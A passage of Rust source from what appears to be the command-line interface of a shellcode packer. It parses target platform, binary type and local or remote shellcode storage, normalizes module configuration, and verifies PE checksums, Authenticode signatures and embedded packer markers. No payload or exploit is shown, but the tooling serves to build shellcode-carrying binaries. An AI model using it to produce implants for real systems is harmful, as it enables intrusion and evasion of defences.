        .with_context(|| format!("writing {}", output_path.display()))?;

    eprintln!(
        "PB  {:<20}  {}  [+] packed -> {}",
        crate_label,
        target_str,
        output_path.display()
    );
    println!("wrote {}", output_path.display());
    Ok(())
}

fn parse_platform(s: &str) -> Result<Platform> {
    match s.to_lowercase().as_str() {
        "windows" => Ok(Platform::Windows),
        "linux" => Ok(Platform::Linux),
        "darwin" => Ok(Platform::Darwin),
        _ => Err(anyhow!(
            "Invalid platform '{}'. Expected: windows, linux, darwin",
            s
        )),
    }
}

/// Infer the target platform from a binary's magic bytes.
/// Returns `None` when the format is unknown (raw shellcode, custom binary, etc.).
fn detect_platform_from_binary(bytes: &[u8]) -> Option<Platform> {
    if bytes.starts_with(b"MZ") {
        return Some(Platform::Windows);
    }
    if bytes.starts_with(b"\x7fELF") {
        return Some(Platform::Linux);
    }
    // Mach-O 64-bit and 32-bit little-endian magic
    if bytes.starts_with(b"\xcf\xfa\xed\xfe") || bytes.starts_with(b"\xce\xfa\xed\xfe") {
        return Some(Platform::Darwin);
    }
    None
}

fn parse_binary_type(s: &str) -> Result<BinaryType> {
    match s.to_lowercase().as_str() {
        "exe" => Ok(BinaryType::Executable),
        "lib" => Ok(BinaryType::DynamicLibrary),
        _ => Err(anyhow!("Invalid target type '{}'. Expected: exe, lib", s)),
    }
}

fn parse_save_type(s: &str) -> Result<ShellcodeSaveType> {
    match s.to_lowercase().as_str() {
        "local" => Ok(ShellcodeSaveType::Local),
        "remote" => Ok(ShellcodeSaveType::Remote),
        _ => Err(anyhow!(
            "Invalid save type '{}'. Expected: local, remote",
            s
        )),
    }
}

fn ext_for_output(platform: Platform, binary_type: BinaryType) -> &'static str {
    match (platform, binary_type) {
        (Platform::Windows, BinaryType::Executable) => "exe",
        (Platform::Windows, BinaryType::DynamicLibrary) => "dll",
        (Platform::Linux, BinaryType::Executable) => "elf",
        (Platform::Linux, BinaryType::DynamicLibrary) => "so",
        (Platform::Darwin, BinaryType::Executable) => "macho",
        (Platform::Darwin, BinaryType::DynamicLibrary) => "dylib",
    }
}

fn parse_module_config(entries: &[String]) -> Result<BTreeMap<String, String>> {
    let mut map = BTreeMap::new();

    for entry in entries {
        let Some((key, value)) = entry.split_once('=') else {
            return Err(anyhow!(
                "Invalid --module-config value '{}'. Expected KEY=VALUE",
                entry
            ));
        };

        let key = key.trim();
        if key.is_empty() {
            return Err(anyhow!(
                "Invalid --module-config value '{}': empty key",
                entry
            ));
        }

        map.insert(key.to_string(), value.to_string());
    }

    Ok(map)
}

fn parse_post_module_config_entry(entry: &str) -> Result<(usize, String, String)> {
    let (idx_raw, kv) = entry.split_once(':').ok_or_else(|| {
        anyhow!(
            "Invalid --post-module-config '{}'. Expected IDX:KEY=VALUE",
            entry
        )
    })?;

    let idx = idx_raw
        .parse::<usize>()
        .map_err(|_| anyhow!("Invalid post-module index '{}' in '{}'.", idx_raw, entry))?;

    let (key, value) = kv.split_once('=').ok_or_else(|| {
        anyhow!(
            "Invalid --post-module-config '{}'. Expected IDX:KEY=VALUE",
            entry
        )
    })?;

    let key = key.trim();
    if key.is_empty() {
        bail!("Invalid --post-module-config '{}': empty key", entry);
    }

    Ok((idx, key.to_string(), value.to_string()))
}

fn plugin_schema_fields(_plugin: &Plugin) -> Vec<PluginConfigField> {
    // Pre-v2.0 this introspected each WASM module's exported
    // `plugin_schema` via Extism. Native modules don't yet declare
    // runtime-discoverable schemas; Step 7+ will wire this up.
    Vec::new()
}

fn maybe_expand_home_path(value: &str) -> PathBuf {
    if value == "~" {
        return home_dir().unwrap_or_else(|| PathBuf::from(value));
    }

    if let Some(rest) = value.strip_prefix("~/") {
        if let Some(home) = home_dir() {
            return home.join(rest);
        }
    }

    PathBuf::from(value)
}

fn looks_like_path(value: &str) -> bool {
    value.starts_with('/')
        || value.starts_with('~')
        || value.starts_with("./")
        || value.starts_with("../")
        || value.contains('/')
        || value.contains('\\')
}

fn normalize_file_value(field_key: &str, value: &str) -> Result<String> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    let path = maybe_expand_home_path(trimmed);
    if path.is_file() {
        let bytes = std::fs::read(&path)
            .map_err(|e| anyhow!("failed to read file for '{}': {}", field_key, e))?;
        return Ok(general_purpose::STANDARD.encode(bytes));
    }

    if general_purpose::STANDARD.decode(trimmed).is_ok() {
        return Ok(trimmed.to_string());
    }

    if looks_like_path(trimmed) {
        return Err(anyhow!(
            "file config '{}' points to '{}' but the file was not found",
            field_key,
            trimmed
        ));
    }

    Ok(value.to_string())
}

fn normalize_file_path_value(value: &str) -> String {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    maybe_expand_home_path(trimmed)
        .to_string_lossy()
        .to_string()
}

fn is_reserved_runtime_key(key: &str) -> bool {
    key.starts_with("post_chain.")
}

fn normalize_reserved_runtime_config(
    mut config: BTreeMap<String, String>,
) -> Result<BTreeMap<String, String>> {
    let keys = config.keys().cloned().collect::<Vec<_>>();

    for key in keys {
        if is_reserved_runtime_key(&key).not() {
            continue;
        }

        let Some(value) = config.get(&key).cloned() else {
            continue;
        };

        if key.ends_with(".module_b64") {
            let normalized = normalize_file_value(&key, &value)?;
            config.insert(key, normalized);
            continue;
        }

        if key.ends_with(".module_path") {
            let normalized = normalize_file_path_value(&value);
            config.insert(key, normalized);
            continue;
        }

        if key.contains(".config.") && key.ends_with("_base64") {
            let normalized = normalize_file_value(&key, &value)?;
            config.insert(key, normalized);
            continue;
        }

        if key.contains(".config.") && key.ends_with("_path") {
            let normalized = normalize_file_path_value(&value);
            config.insert(key, normalized);
            continue;
        }
    }

    Ok(config)
}

fn normalize_runtime_config_for_schema(
    mut config: BTreeMap<String, String>,
    schema: &[PluginConfigField],
) -> Result<BTreeMap<String, String>> {
    config = normalize_reserved_runtime_config(config)?;

    if schema.is_empty() {
        return Ok(config);
    }

    for key in config.keys() {
        if schema.iter().any(|f| &f.key == key).not() && is_reserved_runtime_key(key).not() {
            return Err(anyhow!(
                "Unknown --module-config key '{}'. This module schema defines: {}",
                key,
                schema
                    .iter()
                    .map(|f| f.key.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
    }

    for field in schema {
        let Some(value) = config.get_mut(&field.key) else {
            continue;
        };

        if field.required && value.trim().is_empty() {
            return Err(anyhow!(
                "Config '{}' is required and cannot be empty.",
                field.key
            ));
        }

        match field.field_type.to_ascii_lowercase().as_str() {
            "number" => {
                value.parse::<f64>().map_err(|_| {
                    anyhow!("Config '{}' expects a number, got '{}'.", field.key, value)
                })?;
            }
            "boolean" => {
                let normalized = match value.to_ascii_lowercase().as_str() {
                    "1" | "true" | "yes" | "on" => "true",
                    "0" | "false" | "no" | "off" => "false",
                    _ => {
                        return Err(anyhow!(
                            "Config '{}' expects a boolean, got '{}'.",
                            field.key,
                            value
                        ));
                    }
                };
                *value = normalized.to_string();
            }
            "choice" if field.options.is_empty().not() && field.options.contains(value).not() => {
                return Err(anyhow!(
                    "Config '{}' expects one of [{}], got '{}'.",
                    field.key,
                    field.options.join(", "),
                    value
                ));
            }
            "file" | "file_base64" => {
                *value = normalize_file_value(&field.key, value)?;
            }
            "file_path" => {
                *value = normalize_file_path_value(value);
            }
            _ => {}
        }
    }

    Ok(config)
}

#[derive(Debug)]
struct PeVerifyReport {
    is_pe: bool,
    checksum_current: Option<u32>,
    checksum_calculated: Option<u32>,
    checksum_valid: bool,
    security_dir_va: Option<u32>,
    security_dir_size: Option<u32>,
    markers: Vec<(String, usize)>,
}

fn verify_binary(binary: &PathBuf) -> Result<()> {
    let bytes = std::fs::read(binary)
        .with_context(|| format!("failed to read binary: {}", binary.display()))?;

    let pe = analyze_pe(&bytes)?;

    // Collect human-readable failure reasons. Each push here makes the final
    // exit code non-zero, so automation can `pumpbin-cli verify --binary X`
    // and trust the exit status. Pre-1.1.3 verify always returned Ok(())
    // even with `PE format: no` and `Authenticode invalid`, causing false
    // passes in CI pipelines.
    let mut failures: Vec<String> = Vec::new();

    println!("Binary: {}", binary.display());
    println!("PE format: {}", if pe.is_pe { "yes" } else { "no" });

    // PE-specific checks (Authenticode signature, IMAGE_OPTIONAL_HEADER
    // checksum, embedded markers) only make sense on a valid PE. On
    // ELF/Mach-O/etc. we report once that the input isn't a PE and
    // short-circuit — running osslsigncode on an ELF produced two
    // confusing failure lines for one underlying fact.
    if !pe.is_pe {
        bail!("input is not a valid PE binary");
    }

    let auth = verify_authenticode(binary, pe.security_dir_size.unwrap_or(0));

    if let (Some(current), Some(calculated)) = (pe.checksum_current, pe.checksum_calculated) {
        println!(
            "PE checksum: current=0x{current:08X}, calculated=0x{calculated:08X}, valid={}",
            pe.checksum_valid
        );
        if !pe.checksum_valid {
            failures.push(format!(
                "PE checksum mismatch (current=0x{current:08X}, calculated=0x{calculated:08X})"
            ));
        }
    } else {
        println!("PE checksum: unavailable");
    }

    if let (Some(va), Some(size)) = (pe.security_dir_va, pe.security_dir_size) {
        println!(
            "Authenticode directory: va=0x{va:08X}, size={} bytes{}",
            size,
            if size > 0 { " (present)" } else { "" }
        );
    } else {
        println!("Authenticode directory: unavailable");
    }

    println!("Authenticode verify: {}", auth.summary);
    if let Some(detail) = auth.detail {
        println!("Authenticode detail: {}", detail);
    }
    if matches!(auth.status, AuthCheckStatus::Failed) {
        failures.push(format!("Authenticode verify failed: {}", auth.summary));
    }

    if pe.markers.is_empty() {
        println!("Module markers: none");
    } else {
        println!("Module markers:");
        for (name, offset) in pe.markers {
            println!("- {} @ 0x{:X} ({})", name, offset, offset);
        }
    }

    if failures.is_empty() {
        Ok(())
    } else {
        bail!(
            "verify reported {} failure(s):\n  - {}",
            failures.len(),
            failures.join("\n  - ")
        );
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum AuthCheckStatus {
    /// osslsigncode verify returned success.
    Valid,
    /// osslsigncode verify returned non-zero exit.
    Failed,
    /// We could not run a verification (no osslsigncode on PATH, or no
    /// signature blob present). Reported neutrally — does NOT count as
    /// failure for exit-code purposes.
    NotApplicable,
}

#[derive(Debug)]
struct AuthVerifyStatus {
    summary: String,
    detail: Option<String>,
    status: AuthCheckStatus,
}

fn verify_authenticode(path: &Path, security_dir_size: u32) -> AuthVerifyStatus {
    let output = Command::new("osslsigncode")
        .arg("verify")
        .arg("-in")
        .arg(path)
        .output();

    match output {
        Ok(out) => {
            let combined = format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            let first_line = combined
                .lines()
                .find(|l| l.trim().is_empty().not())
                .unwrap_or("no output")
                .trim()
                .to_string();

            if out.status.success() {
                AuthVerifyStatus {
                    summary: "valid (osslsigncode verify succeeded)".to_string(),
                    detail: Some(first_line),
                    status: AuthCheckStatus::Valid,
                }
            } else if security_dir_size == 0 {
                // osslsigncode exits non-zero for unsigned binaries.
                // That is not a failure — it is an unsigned binary.
                AuthVerifyStatus {
                    summary: "unsigned (no Authenticode signature present)".to_string(),
                    detail: None,
                    status: AuthCheckStatus::NotApplicable,
                }
            } else {
                AuthVerifyStatus {
                    summary: "invalid (osslsigncode verify failed)".to_string(),
                    detail: Some(first_line),
                    status: AuthCheckStatus::Failed,
                }
            }
        }
        Err(_) => {
            if security_dir_size > 0 {
                AuthVerifyStatus {
                    summary:
                        "signature blob present, but osslsigncode is unavailable for cryptographic verification"
                            .to_string(),
                    detail: None,
                    status: AuthCheckStatus::NotApplicable,
                }
            } else {
                AuthVerifyStatus {
                    summary: "no signature blob detected".to_string(),
                    detail: None,
                    status: AuthCheckStatus::NotApplicable,
                }
            }
        }
    }
}

fn analyze_pe(bytes: &[u8]) -> Result<PeVerifyReport> {
    let markers = collect_markers(bytes);

    if bytes.len() < 0x40 || &bytes[0..2] != b"MZ" {
        return Ok(PeVerifyReport {
            is_pe: false,
            checksum_current: None,
            checksum_calculated: None,
            checksum_valid: false,
            security_dir_va: None,
            security_dir_size: None,
            markers,
        });
    }

    let e_lfanew = read_u32(bytes, 0x3C)
        .ok_or_else(|| anyhow!("invalid DOS header: missing e_lfanew"))?
        as usize;
    if e_lfanew + 24 > bytes.len() {
        bail!("invalid PE header offset");
    }
    if &bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Ok(PeVerifyReport {
            is_pe: false,
            checksum_current: None,
            checksum_calculated: None,
            checksum_valid: false,
            security_dir_va: None,
            security_dir_size: None,
            markers,
        });
    }

    let coff = e_lfanew + 4;
    let size_of_optional_header =
        read_u16(bytes, coff + 16).ok_or_else(|| anyhow!("invalid COFF header"))? as usize;
    let opt = coff + 20;
    if opt + size_of_optional_header > bytes.len() {
        bail!("invalid optional header size");
    }

    let magic = read_u16(bytes, opt).ok_or_else(|| anyhow!("invalid optional header magic"))?;
    let data_dir_off = match magic {
        0x10B => opt + 96,
        0x20B => opt + 112,
        _ => {
            return Ok(PeVerifyReport {
                is_pe: true,
                checksum_current: None,
                checksum_calculated: None,
                checksum_valid: false,
                security_dir_va: None,
                security_dir_size: None,
                markers,
            })
        }
    };

    let checksum_off = opt + 64;
    let checksum_current = read_u32(bytes, checksum_off);
    let checksum_calculated = checksum_current.map(|_| compute_pe_checksum(bytes, checksum_off));

    let security_entry_off = data_dir_off + 8 * 4;
    let security_dir_va = read_u32(bytes, security_entry_off);
    let security_dir_size = read_u32(bytes, security_entry_off + 4);

    let checksum_valid = match (checksum_current, checksum_calculated) {
        (Some(c), Some(calc)) => c == calc,
        _ => false,
    };

    Ok(PeVerifyReport {
        is_pe: true,
        checksum_current,
        checksum_calculated,
        checksum_valid,
        security_dir_va,
        security_dir_size,
        markers,
    })
}

fn read_u16(data: &[u8], off: usize) -> Option<u16> {
    let end = off.checked_add(2)?;
    let bytes = data.get(off..end)?;
    Some(u16::from_le_bytes([bytes[0], bytes[1]]))
}

fn read_u32(data: &[u8], off: usize) -> Option<u32> {
    let end = off.checked_add(4)?;
    let bytes = data.get(off..end)?;
    Some(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
}

fn compute_pe_checksum(data: &[u8], checksum_offset: usize) -> u32 {
    let mut sum: u64 = 0;
    let mut i = 0usize;

    while i + 1 < data.len() {
        if i == checksum_offset || i == checksum_offset + 2 {
            i += 2;
            continue;
        }

        let word = u16::from_le_bytes([data[i], data[i + 1]]) as u64;
        sum += word;
        sum = (sum & 0xFFFF) + (sum >> 16);
        i += 2;
    }

    if data.len() % 2 == 1 {
        sum += data[data.len() - 1] as u64;
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = (sum & 0xFFFF) + (sum >> 16);
    sum = sum + (sum >> 16);

    ((sum & 0xFFFF) as u32).wrapping_add(data.len() as u32)
}

fn collect_markers(data: &[u8]) -> Vec<(String, usize)> {
    let patterns = ["PB-AUTHSIG", "PB-ICON"];
    let mut out = Vec::new();

    for pattern in patterns {
        for offset in find_all_occurrences(data, pattern.as_bytes()) {
            out.push((pattern.to_string(), offset));
        }
    }

    out.sort_by_key(|(_, off)| *off);
    out
}

fn find_all_occurrences(haystack: &[u8], needle: &[u8]) -> Vec<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return Vec::new();
    }

    let mut out = Vec::new();
    let mut i = 0usize;
    while i + needle.len() <= haystack.len() {
        if &haystack[i..i + needle.len()] == needle {
            out.push(i);
            i += needle.len();
        } else {
            i += 1;
        }
    }

    out
}
